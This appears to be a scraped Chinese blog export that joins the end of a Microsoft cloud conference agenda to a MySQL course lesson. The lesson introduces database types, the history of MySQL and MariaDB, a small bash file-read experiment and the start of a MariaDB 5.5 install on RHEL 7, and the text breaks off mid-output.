立即订阅数据防泄露，基于 Microsoft 信息保护和威胁防护的全流程实战李辉 立即订阅机器人即服务(RaaS)加速物流智能化转型沈沐，王关平 立即订阅Azure Spring Cloud: 在 Kubernetes 上运行 spring boot 微服务的新方式梁莉 立即订阅通过智能身份和访问管理，保护企业安全李辉 立即订阅13:50-14:40How To Build Machine Learning Models with Low CodeMike Chan（HK） 立即订阅14:40-15:30生产应用程序的 Debugging 和 InteractingThomas Huang （TW） 立即订阅DevOps 与 GitHub 在企业中的最佳实践庄俊乾 立即订阅企业内部风险与合规管理林坚乐（TW） 立即订阅云平台的安全响应机制陈健宁，陈彬彬 立即订阅让数据产生价值，基于数据湖的大数据平台建设毕伟 立即订阅中台再思考，微软如何构建现代化数据平台？朱人杰 立即订阅使用 Azure IoT Plug and Play 快速构建物联网方案詹文平 立即订阅15:30-16:20洞察威胁，全面保护——Microsoft Threat Protection 侦测调查的威力 龚祺莎 立即订阅16:20-17:10Azure Synapse 在游戏数据分析中的最佳实践杨永波 立即订阅基于 Azure IoT Hub 构建物联网设备管理与数据处理解决方案 施佳 立即订阅微软云 AI 平台助力开发者快速构建计算机视觉应用陈堰平 立即订阅使用 MLOps 进行机器学习生命周期管理赵明杰 立即订阅如何实现云计算网络的纵深防御体系 王文斌 立即订阅为什么 VS Code 如此流行？韩骏 立即订阅Azure Sphere 在亿级设备体量下的端到端一站式深度数据防护实践连矩锋 立即订阅17:10-18:00如何通过 SDL 和 SecDevOps 实现软件及应用的原生安全朱长明 立即订阅下一代智能数仓助力企业数字化转型李扬 立即订阅4月17日09:00-09:50愿景演讲萨提亚•纳德拉，柯睿杰 立即订阅09:50-10:30微软 Azure：世界的电脑Mark Russinovich 立即订阅10:30-11:10微软 Power Platform 技术路线与战略Charles Lamanna 立即订阅11:10-11:50Keynote from GitHubMichael Francisco 立即订阅13:00-13:30疫后反思：借助 Microsoft 365 重塑企业智能办公体系李亮 立即订阅13:30-14:20微软 Power Platform “全民低代码开发”灌注企业创新强大生命力张蔚 立即订阅企业上云现代化的历程徐明强 立即订阅智能、安全、合规：围绕 Microsoft Teams 构建未来云协作平台唐浩 立即订阅企业级低代码开发平台的市场趋势与PowerApps中国市场策略韦青，李威 立即订阅如何提升 Azure 云平台的隐私与环境治理赵健 立即订阅14:20-15:10PowerApps 低代码开发平台赋能员工数字化转型最后一公里方庆 立即订阅15:10-16:00云平台助力企业创新——基于 Linux 的云上最佳实践马平 立即订阅Microsoft Teams 一站式会议解决方案（TW）Kim Cheng 立即订阅多渠道触点智能客服技术架构及混合现实现场服务演示吴淑玲 立即订阅SAP+Azure，助力业务优化革新方迅，丁晓枫，童麒麟 立即订阅Microsoft Teams 行业应用场景概览（HK）Dan Stevenson 立即订阅16:00-16:50Microsoft Teams as Platform: 围绕 Teams 的平台化战略与实践陈希章 立即订阅16:50-17:40Power BI 赋能企业财务转型贾菁 立即订阅如何利用开源数据库实现数据现代化赵阳 立即订阅使业务跟上发展的步伐——加速应用程序现代化李一峰 立即订阅Dynamics 365 财务和运营与 Azure Data Lake / Synapse / 通用数据服务 的深度整合剖析张翼翔 立即订阅互联，预测，认知与创新—— Dynamics 365 助力智能供应链转型张骏 立即订阅17:40-18:30Compliance, privacy, and securing your data in Dynamics 365 and Power Platform（HK）Wilson Kong 立即订阅4月18日09:00-09:40主题演讲：Microsoft 365 企业效率与协作保罗·洛里默 立即订阅09:40-10:20主题演讲：基于 K8S 和 Azure 的云原生Brendan Burns 立即订阅10:20-10:50开源在企业中的应用与发展趋势 （English Session）Chris Aniszczyk 立即订阅10:50-11:40侵略如火，不动如山——微软如何通过“零信任”守护企业安全张美波 立即订阅微软云安全战略 （English Session）Fernando Cima 立即订阅Azure 无服务器与微服务治理模式Alan Liu 立即订阅知识产业流程自动化的技术跃迁胡世超，鲍捷 立即订阅微软 AI 语音云圆桌会议：如何利用语音技术应对复杂对话识别和情感声音合成等多种挑战廖勤樱，Alan Ip，刘越颖，赵澈 立即订阅11:40-12:30Using Pre-Built AI to Solve Business ChallengesJose Hui（HK） 立即订阅13:00-13:50AI 知识挖掘：使用 Azure 搜索内置 AI 能力从内容中挖掘知识王芷 立即订阅简化 K8s 开发！OAM 与 DAPR 云原生应用的全流程研发实战白海石 立即订阅数据防泄露，基于 Microsoft 信息保护和威胁防护的全流程实战李辉 立即订阅通过智能身份和访问管理，保护企业安全李辉 立即订阅Azure Spring Cloud: 在 Kubernetes 上运行 spring boot 微服务的新方式梁莉 立即订阅13:50-14:40How To Build Machine Learning Models with Low CodeMike Chan（HK） 立即订阅14:40-15:30生产应用程序的 Debugging 和 InteractingThomas Huang （TW） 立即订阅DevOps 与 GitHub 在企业中的最佳实践庄俊乾 立即订阅企业内部风险与合规管理林坚乐（TW） 立即订阅云平台的安全响应机制陈健宁，陈彬彬 立即订阅让数据产生价值，基于数据湖的大数据平台建设毕伟 立即订阅使用 Azure IoT Plug and Play 快速构建物联网方案詹文平 立即订阅15:30-16:20洞察威胁，全面保护——Microsoft Threat Protection 侦测调查的威力 龚祺莎 立即订阅16:20-17:10Azure Synapse 在游戏数据分析中的最佳实践杨永波 立即订阅基于 Azure IoT Hub 构建物联网设备管理与数据处理解决方案 施佳 立即订阅微软云 AI 平台助力开发者快速构建计算机视觉应用陈堰平 立即订阅使用 MLOps 进行机器学习生命周期管理赵明杰 立即订阅如何实现云计算网络的纵深防御体系 王文斌 立即订阅为什么 VS Code 如此流行？韩骏 立即订阅Azure Sphere 在亿级设备体量下的端到端一站式深度数据防护实践连矩锋 立即订阅17:10-18:00如何通过 SDL 和 SecDevOps 实现软件及应用的原生安全朱长明 立即订阅下一代智能数仓助力企业数字化转型李扬 立即订阅暂无日程数据专题分会场主题演讲 4月17日萨提亚•纳德拉 微软公司首席执行官，柯睿杰 微软全球资深副总裁 微软大中华区董事长兼首席执行官，Mark Russinovich 微软 Azure 首席技术官，Charles Lamanna 微软全民应用开发平台全球副总裁查看专题 &gt;主题演讲 4月18日微软全球副总裁 Paul Lorimer 将与您分享和讨论Microsoft 365如何帮助全球企业 在当前这段特殊时期保持生产和运转，通过一套现代化的生产力服务集合，客户如何灵活组合及利用其能力，随时随地高效协作，灵活应对各种需求。 Kubernetes联合创始人，微软开源及云端平台副总裁，将涵盖云原生的实践应用，并探讨Kubernetes开源项目如何帮助实现这种数字转型。查看专题 &gt;云：业务上云微软提供一系列业务上云的工具、指南与技术方案，通过总结 Azure 的架构、数据库、虚拟化等相关技术经验来为开发者及企业提供全套解决方案，助力企业业务上云。查看专题 &gt;生产力：智能+现代化办公微软通过 Microsoft Teams 等工具及其十多年的远程协作经验，立体式为行业输出一套规范的、具备极高实践价值的远程智能办公协作体系，在提升企业远程办公效率的同时确保企业信息安全。查看专题 &gt;商业应用：低代码开发+自动化微软企业级代码开发平台 Power Platform 为企业创新转型灌注新的生命力，并将发布基于 AI builder，Azure Data，Synapse Insights 等一系列技术的新平台，借由无代码编程和自动化技术来加速企业的数字化进程。查看专题 &gt;云：AI &amp; IoT通过技术实现到场景应用，从单点应用效果到行业实践全貌，集中介绍微软 IoT 安全物联网能力以及微软基于 AI 的端到端安全定制化解决方案，充分展示微软对于人工智能的价值观以及其在安全领域的领导力。查看专题 &gt;云：云原生、开源与 DevOps通过利用微软众多技术成果来帮助企业实现最敏捷的创新协作流程，为企业与开发者展示基于云的原生数字化转型技术，帮助企业能够快速且最低成本的实现业务需求。查看专题 &gt;云：云运维与安全合规微软云安全架构以及基于“零信任”的安全体系将单点业务安全能力扩展至一整套标准化的云上业务，通过安全运维、身份和访问管理、信息保护、威胁防护以及企业级云安全管理等领域的解决方案来确保企业业务在云上的健康发展。查看专题 &gt;实践落地：数字化转型最佳实践 4月17日深耕数字化领域多年的微软技术专家与架构师联合微软合作伙伴共同将微软过去在各领域实践中所碰到的问题以及经验毫不吝啬地贡献给业界，旨在为各行业打造一套全面的数字化转型模板范式，共同加速全球企业的数字化进程。查看专题 &gt;实践落地：数字化转型最佳实践 4月18日深耕数字化领域多年的微软技术专家与架构师联合微软合作伙伴共同将微软过去在各领域实践中所碰到的问题以及经验毫不吝啬地贡献给业界，旨在为各行业打造一套全面的数字化转型模板范式，共同加速全球企业的数字化进程。查看专题 &gt;云：Big Data微软通过自身在数据平台、数据湖、Azure 机器学习、计算机视觉以及智能数仓等下的真实实践为整个行业提供关于大数据处理的最佳解决方案，优化企业的大数据处理模式，让企业的数据成为其加速数字化转型的推手。查看专题 &gt;","link":"/2020/04/13/booboo_hbcloud/2020-04-13-hb-cloud/"},{"title":"MySQL 管理课程 第二课 MySQL和MariaDB数据库介绍","text":"数据库的基础概念数据库(database): 保存有组织的数据的容器(通常是一个文件或一组文件)。 数据库管理系统(DBMS): 顾名思义，既然是数据管理系统，就是用来管理数据的数据库软件 * 线上生产环境中有很多数据，举例说明，论坛、qq、微博、朋友圈等等。 *在我们线上生产环境当中有很多数据，那么用户比如说登一个论坛发了个帖子，这个帖子里的内容就是一个数据；用户登陆一个购物网站，买了一个商品，用户购买一个商品是一个订单信息，也是一个数据，各种各样的环境，我们会发现，在我们的线上应用当中，存在很多用户信息，他购买商品也好，发帖子也好，或者他打游戏注册帐号也好，等等，这些东西其实都是信息，我们需要将这些信息保存下来，因为以后每次用户登陆时都需要反复的读写，读写你购买过的商品，读写你发过的帖子，随着我们用户数量越来越多，这种类似的数据会越来越多，从一开始的一个用户到后面的一万个用户，到成年累月下来，我们发现论坛已经有了几千万条帖子，每个帖子又有很多的回复，这时候你会发现我们的数据量越来越大。 * 数据早期保存的方式，文本文件，介绍读取方式、优缺点，举例说明，做一个小实验。 *那么在早些年的时候呢，我们说最早数据保存的方法是文本方式保存，文本文件保存，就是说我们网站上有一千万个帖子，我们把这一千万个帖子放在一个文本文档里，当用户登陆后要读帖的时候，就要从这个文本文件中去读，后来我们发现，当文本文件行数比较少的时候，几百行几千行几万行还行，要是几十万行几百万行的话，你会发现读取的时候非常的慢，慢的话，有的时候需要半分钟，有的时候可能需要五分钟，甚至有时候半小时，那么很明显这个速度是不行的，没有哪个用户说愿意为了看个帖子，在那里等个半小时。看到你帖子出来了，好，开始回帖，然后一个回帖操作完成又要等半个小时，才能看到回帖的结果。很明显不行，所以呢，我们会发现文本文档方式保存信息有一个非常大的缺点，就是我们的读写速度，随着文件内容的增加，他的读写速度会越来越慢，关于这一点，你们可以自己做个实验测以下，写个几十万行的数据2-3个G，过滤出某一行，或者读一下，看看要花多上多少时间。 123456#!/bin/bashtouch /tmp/afor i in `seq 1 500000 `do sed -n &apos;1,$r /var/log/messages&apos; /tmp/adone * 我们希望的数据读取方式是怎样的呢？引出数据库的概念。 *我们在操作过程的当中，并不希望把所有的数据都读取出来，很多时候我可能只需要读取其中的一行，而文本文档的操作命令，属于牛操作，他需要从头部开始做，很多时候他过滤的话都会从头到尾寻找一遍，才能找到你需要的那一行数据，或者多行数据，那么在这个过程中会极大地消耗性能。我们希望实现的效果是，如果我们需要取其中的几行，则迅速地定位到那几行数据，也就是说我不单要知道文本文件所在的位置，我还知道文本文件当中每一行所在的系统的位置，不单是系统还有硬盘上的位置，他在硬盘的第几个磁道，第几个扇区，我要第十行到哪里去找，取第1000行到哪里去找，不需要从头部去找，这是一种文件的操作方法，或者是数据的操作方法，于是就有了我们的数据库。 数据库如果要实现这个功能，在几十G的文件中迅速定位到你需要的数据，他需要** 索引**，所以尽量去保存可索引数据，这样才会让读写性能有所提高。但是总会有人把图片视频（二进制数据）放到数据库中，数据库是没办法对二进制文件内容做索引的。数据分可索引数据和不可索引数据。但也不是说二进制数据就不能放在数据库中，只是说放进去对性能没有提高。比如说做个论坛，如果发帖有附件，那么附件是上传到网站根目录下的，在做备份的时候，数据库要备份，网站根目录下的文件要备份，有人呢就偷懒将所有数据都放到数据库下，备份的时候就只要备份数据库了，但是我不建议这么做，因为本身数据库已经很大了，你再把这些二进制文件往里面放会导致数据库更大，更加臃肿。而且数据库本身有很多缓冲，你放的文件太大，缓冲就用得多，缓冲用的多，内存消耗大，数据库的性能消耗会明显上升。所以自己去看，尽量不要去保存不可索引的数据。 数据库的分类|数据库类型|描述|主流产品|有谁在用|适用场景|不适用场景||:–|:–|:–|:–|:–|:–|:–||关系型数据库|关系型数据库就是由二维表及其之间的联系组成的一个数据组织|Oracle、DB2、PostgreSQL、Microsoft SQL Server、Microsoft Access、MySQL、MariaDB|alibaba,sina,网易，youtube，google等|保持数据的一致性（事务处理）；由于以标准化为前提，数据更新的开销很小（相同的字段基本上都只有一处）；可以进行Join等复杂查询；能够保持数据的一致性是关系型数据库的最大优势|大量数据的写入处理；为有数据更新的表做索引或表结构(schema)变更；字段不固定时应用；对简单查询需要快速返回结果的处理||键值（Key-Value）数据库|键值数据库就像在传统语言中使用的哈希表。你可以通过 key 来添加、查询或者删除数据，鉴于使用主键访问，所以会获得不错的性能及扩展性。|Riak、Redis、Memcached、Amazon’s Dynamo、Project Voldemort| GitHub （Riak）、BestBuy （Riak）、Twitter （Redis和Memcached）、StackOverFlow （Redis）、 Instagram （Redis）、Youtube （Memcached）、Wikipedia（Memcached）|储存用户信息，比如会话、配置文件、参数、购物车等等。这些信息一般都和 ID（键）挂钩，这种情景下键值数据库是个很好的选择。 |1. 取代通过键查询，而是通过值来查询。Key-Value 数据库中根本没有通过值查询的途径。2. 需要储存数据之间的关系。在 Key-Value 数据库中不能通过两个或以上的键来关联数据。3. 事务的支持。在 Key-Value 数据库中故障产生时不可以进行回滚。||面向文档（Document-Oriented）数据库| 面向文档数据库会将数据以文档的形式储存。每个文档都是自包含的数据单元，是一系列数据项的集合。每个数据项都有一个名称与对应的值，值既可以是简单的数据类型，如字符串、数字和日期等；也可以是复杂的类型，如有序列表和关联对象。数据存储的最小单位是文档，同一个表中存储的文档属性可以是不同的，数据可以使用 XML、JSON 或者 JSONB 等多种形式存储。 |MongoDB、CouchDB、RavenDB| SAP （MongoDB）、Codecademy （MongoDB）、Foursquare （MongoDB）、NBC News （RavenDB） |1. 日志。企业环境下，每个应用程序都有不同的日志信息。Document-Oriented 数据库并没有固定的模式，所以我们可以使用它储存不同的信息。2. 分析。鉴于它的弱模式结构，不改变模式下就可以储存不同的度量方法及添加新的度量。|在不同的文档上添加事务。Document-Oriented 数据库并不支持文档间的事务，如果对这方面有需求则不应该选用这个解决方案。||列存储（Wide Column Store/Column-Family）数据库| 列存储数据库将数据储存在列族（column family）中，一个列族存储经常被一起查询的相关数据。举个例子，如果我们有一个 Person 类，我们通常会一起查询他们的姓名和年龄而不是薪资。这种情况下，姓名和年龄就会被放入一个列族中，而薪资则在另一个列族中。 |Cassandra、HBase| Ebay （Cassandra）、Instagram （Cassandra）、NASA （Cassandra）、Twitter （Cassandra and HBase）、Facebook （HBase）、Yahoo!（HBase）| 1. 日志。因为我们可以将数据储存在不同的列中，每个应用程序可以将信息写入自己的列族中。2. 博客平台。我们储存每个信息到不同的列族中。举个例子，标签可以储存在一个，类别可以在一个，而文章则在另一个。| 1. 如果我们需要 ACID 事务。Vassandra 就不支持事务。2. 原型设计。如果我们分析Cassandra 的数据结构，我们就会发现结构是基于我们期望的数据查询方式而定。在模型设计之初，我们根本不可能去预测它的查询方式，而一旦查询方式改变，我们就必须重新设计列族。||图（Graph-Oriented）数据库 |图数据库允许我们将数据以图的方式储存。实体会被作为顶点，而实体之间的关系则会被作为边。比如我们有三个实体，Steve Jobs、Apple 和 Next，则会有两个“Founded by”的边将 Apple 和 Next 连接到 Steve Jobs。 |Neo4J、Infinite Graph、OrientDB |Adobe （Neo4J）、Cisco （Neo4J）、T-Mobile （Neo4J） |1. 在一些关系性强的数据中2. 推荐引擎。如果我们将数据以图的形式表现，那么将会非常有益于推荐的制定 不适合的数据模型。图数据库的适用范围很小，因为很少有操作涉及到整个图。| 关系模型就是指二维表格模型,因而一个关系型数据库就是由二维表及其之间的联系组成的一个数据组织。当前主流的关系型数据库有Oracle、DB2、PostgreSQL、Microsoft SQL Server、Microsoft Access、MySQL、MariaDB、浪潮K-DB等。 什么是MySQL什么是mysql？摘自官方的一个解释，说 ** “MySQL 是采用客户/服务器模型的开放源码关系型 SQL 数据库管理系统,它 可以在多种操作系统上运行,它是由 MySQL Ab 公司开发、发布并支持的，后被sun收购，现在在oracle公司旗下，现在有一个知名的分支MariaDB。” ** 稍微有点长，我们一段一段来解释，里面有一些关键点，能够帮助你非常有效地去理解MySQL。 * 第一个要点，客户/服务器模型。 * 通过C/S和B/S的对比去介绍为什么mysql选择c/s模型，分别从方便、性能、稳定、安全四个方面来讲。 mysql是一个c/s模型地一套应用程序，其实讲到c/s模型大家就会联想到，b/s模型，c/s叫做客户端/服务器，b/s叫做浏览器/服务器。服务器还是服务器，只不过客户端是装一个应用服务呢，还是直接用浏览器。那么两种模型呢各有优劣点，如果我们希望使用起来更方便，那使用浏览器是更方便的，因为不管什么系统都自带浏览器，比如手机自带、pad自带，各种环境都有浏览器，这种情况比较方便；但是浏览器主要通过网络，那么性能、稳定、安全性就会受到一定地影响。而c/s模型就不是，我装一个客户端软件，客户端和服务器端地通信是走自己专有地协议的，他们可以实现一个高效、稳定的通信，所以c/s模型他最大的有点是性能高、稳定好、功能多、安全性好，各种各样的优点，相对于b/s模型来说要装一个客户端软件，用起来没有他方便。我们mysql用的是c/s模型，因为我们不是考虑让你用起来方便，我们的关注点就是性能更加高效，关注的就是安全，数据库里面的数据非常的重要，经常我们的用户名和密码都是放在数据库里面，数据库泄露会导致很多问题。大家平时在上网过程中有没有曾经遇到过一些情况，比如登陆微博、QQ，登陆的时候他告诉你，你的密码不够安全，要求你修改密码，之前有没有遇到过，莫名其妙，登上来就告诉你要修改密码，凭什么说你密码不安全，我告诉你哪怕你密码设得再复杂他也会跟你讲你的密码不安全，原因是因为他数据库泄露过了，他数据库泄露了又不能直接跟你讲：“我数据库泄露了，你快改密码阿！”他不能说的，只能告诉你你的密码不安全，让你改。如果你没有修改，很可能就会被盗号了。从这个例子我们就可以知道数据库的安全性问题的重要性。包括去年很火的，非常出名的一件事，12306数据库泄露，大家买过的火车票，买火车票时使用的身份证、用户名、密码、银行信息就都泄露了，泄露了大概十几个G的用户信息，知道吗？在12306上买过火车票吗？买过，那很可能你的身份证信息已经被泄露了。所以我们这里讲数据库关注的点，不是让你使用起来更方便，而是要保证性能、安全、稳定。稳定也是一个比较重要的地方，数据库不能出错，不能说连着连着，一会连不上了。今天去存钱，存完钱明天去取钱，存了多少钱不知道，为什么呢？数据库没连上，你昨天存的钱我找不到，这是一个稳定性。你要保证数据库7*24小时在线运行，不能出任何问题。好这就是我们讲的c/s模型。 * 第二个要点，开放源码。 * 介绍open source和closed source的概念和区别，介绍mysql的开源理念以及历史，介绍“去IOE”以及Mariadb的诞生。 什么叫做开源？open source和他相对应的就是闭源closed source应用，闭源的东西又叫做copyright（版权、著作权），微软的东西一般都是copyright；而开源的叫做copyleft（非盈利版权，公共版权）。公司赚钱有两个大的流派，一个流派就是以微软、oracle为首的闭源软件起家的，他们认为程序写完之后你得拿去卖，卖代码来赚钱，我卖给你使用，你给我钱，这样的话呢，我才能活得更滋润一点；开源应用不是，他认为我程序写完之后，可以免费给你使用，然后你要是觉得有问题，你告诉我你做过的修改，你也应该把他开源出来，我们开源的人越多，修改的人越多，程序就会越做越好，不反对你赚钱，但是你赚钱的收入点不是在程序本身，而是在于你后期所提供的服务，提供的一些额外的操作，这是开源领域的一些理念，以redhat为首，他就是以开源为目标的。mysql开始设计的时候，就是一个开源产品，当然这是以前的事情了，mysql当年是开源的，然后被收购了，其实我们说阿，做开源的人呢，赚钱最好的方式就是找人把他给收了，收购的话基本上能赚一大票，收购mysql的是当时比较著名的sun公司，有很多非常经典的产品都是sun开发出来的，比如他的java编程语言。除了java语言以外sun公司还开发过很多经典的技术，那么sun公司的话，有钱有实力，但是呢不太会经营，最后就倒闭了，然后被另外一家收购，现在mysql所属于oracle。当年收购完mysql之后呢，他觉得，我的oracle产品面向于大型的公司，我需要一个产品来弥补中的端企业的空缺，于是他就收购了mysql，收购完之后本身觉得没什么位难题，后来mysql在oracle的带领下越做越好，因为oracle在数据库领域算得上是排名第一了。他有很多专有的数据库技术，能够让数据在读写过程当中，性能非常高，然后又有高可用，有很多的有点，mysql越做越好，好到什么程度呢？不单单是中小型企业在用，大型企业也开始用mysql，用下来觉得比oracle要好，出现这种现象，以至于我们在前几年的时候有人提出了一个，俗称为IT界的革命，叫做“去IOE”。什么叫做“去IOE”呢？三个非常著名的公司，IBM、ORACLE、EMC，这三个公司有业界一流的产品，IBM有他的小型机，从服务器的性能上来讲小型机已经算是顶尖的，比你的pc server要好的多；然后oracle的数据业界顶尖的；EMC的存储设备也是业界顶尖的。经常呢有公司说我的压力特别大，我需要去买最好的硬件，就买这三家公司的，放在一起组成一套性能非常强大的这么一套硬件环境。后来这些公司发现这样不划算，因为你每年买这些硬件要花几千万，这些硬件非常贵的阿，像IBM的小型机几十万上百万；存储，没有一百万你别谈，谈不了，以后要是老板跟你说，要你搭一套商业的高性能的存储方案，特别是数据库用的，你先问他有没有一百万，一百万都不给我，拿什么去谈，谈不了；oracle也不说了，按cpu给你卖钱，看你的服务器几个cpu是吧，现在服务器多核，多核你就多付钱吧。后来公司说我一年买几千万，都没赚多少，赚的钱一大半用来买硬件了，能不能成本低一点。IBM的小型机换成了pc server，比我们这里的服务器稍微好一点，我们是1U的，他们起码2U的，买一些pc server，单台服务器的性能比IBM的小型机要低，但是我们现在有非常成熟的集群解决方案，有高可用集群、负载均衡集群、高性能计算集群，当多台pc server放在一起的时候，他整体价格要比IBM的便宜，而且提供的整体性能也比IBM高，无非就是浪费一些地方，但是会发现得到的是成本降低、收益更好。一台IBM上百万，我买10台pc server性能就超过你了，所以pc server划算。oracle这里不说了，你要收钱的，我就用不收钱的mysql，用mysql跑跑，当然了，现在有很多大公司会把oracle换成mysql，也不是全部都换掉，有一些非常核心的应用还是跑在oracle上面，oracle还是有他的有点的。存储这里呢，我们现在有isan的存储，以后讲到存储会去讲，isan存储比我们学过的nfs、samba的性能要高，但是成本低，不需要拿个几百万出来。针对这些情况，IBM怎么想的我不知道，EMC怎么想的我也不知道，但是我知道oracle怎么想的。oracle说我收购mysql是想让中小型企业用的，好阿，你们现在都用了是吧，oracle卖不出去了，那怎么办呢？是大家别用呢？还是怎么做比较好？把mysql掐死，你们不是觉得mysql开源不要钱吗，反正他是领养的孩子，oracle才是我自己的孩子，领养的孩子抢自己孩子的蛋糕，那我就掐死他。好了，oracle决定把mysql闭源，慢慢地将mysql的技术做逐步闭源。那他一做闭源，用户就发现问题了，我开始用mysql，结果你先在mysql也要收钱，那么最关键的是mysql的开发者，当年最早地开发者，一个开始在mysql-AB公司，后来被sun收购后去了sun公司，sun公司也是秉持开源理念地，所以也做地比较开心，oracle收购完之后呢，开始也开源，后来呢变闭源了，这些人受不了了，这些人不在乎赚多少钱，在乎地是个人理想。我要实现个人理想，我的理想就是把这个软件越做越好，然后让大家免费使用，这是个人理想，这些人称之为黑客。哪些人叫黑客，搞破坏的那些人不是黑客，崇尚开放、平等、自由的，然后又有高超的计算机水平的这些人就是黑客。就像linux的创始人，Linus Torvalds林纳斯 托瓦兹，他们都是非常著名的黑客。既然你mysql要收钱，那我就不干了，所以当年mysql最早的开发者当中的一个领头，他就跳槽出来了，然后带了一批手下做了一个开源社区又吸收了一批人，开始写一个新的数据库，就是我们rhel7当中的mariadb。Mariadb，有很多地方跟mysql很像，你会发现在操作mariadb的过程当中用到的都是mysql的命令，登陆mysql、备份mysqldump，你会发现mariadb所有的接口都和mysql的接口一模一样，内部的函数名都和myslq的一模一样。所以呢，你可以很方便地从mysql的环境迁移到mariadb上面。maraidb也做的非常好，刚开始比不过mysql，但是近两年mysql有的优点他都有，甚至他还有很多自己转有的优点，oracle这时候坐不住了，我现在闭源，闭源以后呢没人来买我的oracle，大家换成mariadb了，那我这个闭源的意义就没了，所以最近呢又发表声明，说“大家放心，我以后不会再闭源了！mysql以后还会以开源的方式一直存在下去。”不会收钱了，但是也没什么人理他了，更多的人都愿意相信，愿意去使用mariadb了。mysql也有人用，mariadb也有人用，现在就变成这个市场，mysql和mariadb各占了一部分江山。这个呢就是开放源码。 * 第三个要点，关系型。 * 介绍关系型和非关系型数据库的概念和优劣点 所谓关系型是指,将数据保存在不同的表中,表与表之间支持一定的关系，而不是将所有数据放在 一个大的仓库内。这样就增加了速度并提高了灵活性。什么是关系型数据库？我们在存放数据的时候，数据很多，几百万几千万行，如果说我们把所有的数据放在一个文件里面，虽然数据库的读写性能会比一般的程序来的高，但是文件太大总归多多少少会影响一些性能，为了能够让我更快地读取数据，我会考虑把数据拆分开来，不同的数据放在不同的文件当中，而数据库里面基本的存储方式叫做表。也就是说我们的数据是放在不同的表里面。数据库管理员管什么东西呢，管表，所以我们经常是这么说的，叫数据库管理员，男的叫表哥，女的叫表姐，老大叫做大表哥。那么我现在把数据放在不同的表里面，表和表之间能不能支持一定的关系，因为我们经常在操作表里的数据的时候是有关系的，比如说，我可能有个表叫员工表，有个表叫工资表，工资表里面发钱，发钱的时候呢，每一个发工资的人应该在员工表里面存在，你不能说发钱发给不是我们公司的人，不认识的人，这不行。所以呢，这是一个表和表之间的关系。能够把这些关系实现出来的，我们一般把他叫做关系型数据库。能够以表来存储，并在表和表之间支持一定的依赖关系，各种各样的依赖关系，可能是大小值的判断，可能是存在的判断，等等。当然我们除了关系型数据库以外呢，还有一种数据库叫做，键值型数据库，比如memcache\\redis数据库，典型的代表例子，优点是性能更加高，基本都是使用内存来存放数据，但是能实现的功能很简单，他不是基于表的，功能很简单，你只能查a是多少，什么值是多少。 * 第四个要点，SQL语句。 * 介绍SQL语句的概念 MySQL 中的 SQL 指的是“结构化查询语言”。SQL 是访问数据库的最常用的标准化语言。他是统一的操作语法，我们说的是数据库统一的操作语法。也就是说在mysql里面学的sql语句以后你在其它数据库中也同样适用。每个数据库自己的sql语句很少，百分之九十五都是一样的。Sql语句时间不够学没关系，后面还有oracle课程，会去详细学习sql语句。我们再回顾一下mysql的定义。MySQL 是采用客户/服务器模型的开放源码关系型 SQL 数据库管理系统,它可以在多种操作系统上运行,不要以为他只能在linux系统上运行，windows系统也能运行。应该这么说，Mysql在linux上运行性能更好，稳定性更高，包括oracle也是，oracle也能装在windows上面，但是跟装在linux上面性能不一样，oracle官方推荐安装在linux上面，mysql也有windows版本，整个安装过程相当简单。可以去下载一个“wamp.exe”软件，下载下来一路next安装到底，就类似与LAMP的环境，就搭建好了。这是多平台运行。Mysql从mysqlab公司到sun公司再到oracle公司。目前是在oracle公司旗下。 如何获得MySQL相关资源 为了学习更多的MySQL知识,请访问MySQL官网 http://dev.mysql.com/。 为了下载服务器的一个副本,请访问MySQL官网 http://dev.mysql.com/downloads/。 MySQL在企业中的应用场景MySQL 是世界上 ** 最受欢迎的开源数据库 ** ,她拥有相当大的装机量。而且 DB-Engines 的排名一直处于数据库总榜第二名的位置,仅次于 Oracle。MySQL 在开源领域排名第一,而第二大开源数据库 PostgreSQL 的分数仅仅是 MySQL 的零头。 MySQL 拥有庞大的用户群,国外的有 ** Facebook、Flickr、eBay ** 等,国内的有 ** 阿里、腾讯、新浪、百度等 ** 。而这些互联网和大部分传统公司的服务需要 ** 7×24 ** 小时连续工作。当此类型网站的部分数据库服务器宕机时,就需要高可用技术将流量牵引至备份主机,从而此时这些公司需要通过 ** 备份和恢复 ** 手段来产生备机,并通过 ** 复制 ** 来同步主备机间的状态,同时部署各种 ** 监控 ** 软件来监控服务器状态。当异常数据库服务器宕机时,通过手工或自动化手段将主机流量切换至备机,这个动作叫作 ** failover ** 。而一些大型公司在面对成千上万台 MySQL 服务器时,通常使用 ** 自动化运维脚本 ** 或程序完成上述种种动作。 MySQL 数据库安装课程要求： 学会MariaDB 5.5的安装 学会MariaDB 10.2的安装 学会MySQL 5.6的安装 学会MySQL 5.7的安装 MySQL自动安装脚本 安装方法 num 安装方法 说明 是否编译好 a 二进制文件 解压即可 编译好的 b 包管理 rpm,deb 编译好的，有版本(推荐使用) c 源代码 类似Mplayer 自己编译（按需选择参数；代码优化） RHEL 7.2 RPM 包安装 MariaDB 5.5 项目 参数 软件名 mariadb-server 5.5 service mariadb daemon mysqld 配置文件 /etc/my.cnf /etc/my.cnf.d/*.cnf 数据文件 /var/lib/mysql 日志文件 /var/log/mariadb/mariadb.log（错误日志，启动日志） 端口号 3306 1234567891011121314151617181920212223242526# 安装必要的软件包[root@mastera0 ~]# yum install -y vim net-tools wget[root@mastera0 ~]# yum list|grep mariadbRepodata is over 2 weeks old. Install yum-cron? Or run: yum makecache fastmariadb-libs.x86_64 1:5.5.44-2.el7 @anaconda/7.2mariadb.x86_64 1:5.5.44-2.el7 rhel_dvd mariadb-bench.x86_64 1:5.5.44-2.el7 rhel_dvd mariadb-devel.i686 1:5.5.44-2.el7 rhel_dvd mariadb-devel.x86_64 1:5.5.44-2.el7 rhel_dvd mariadb-libs.i686 1:5.5.44-2.el7 rhel_dvd mariadb-server.x86_64 1:5.5.44-2.el7 rhel_dvd mariadb-test.x86_64 1:5.5.44-2.el7 rhel_dvd [root@mastera0 ~]# yum install -y mariadb-server# 查看软件架构[root@mastera0 ~]# rpm -ql mariadb-server# 启动服务[root@mastera0 ~]# systemctl start mariadb# 查看守护进程[root@mastera0 ~]# ps -ef|grep mysqldmysql 2496 1 0 13:56 ? 00:00:00 /bin/sh /usr/bin/mysqld_safe --basedir=/usrmysql 2653 2496 0 13:56 ? 00:00:00 /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64/mysql/plugin --log-error=/var/log/mariadb/mariadb.log --pid-file=/var/run/mariadb/mariadb.pid --socket=/var/lib/mysql/mysql.sockroot 2694 2347 0 13:56 pts/0 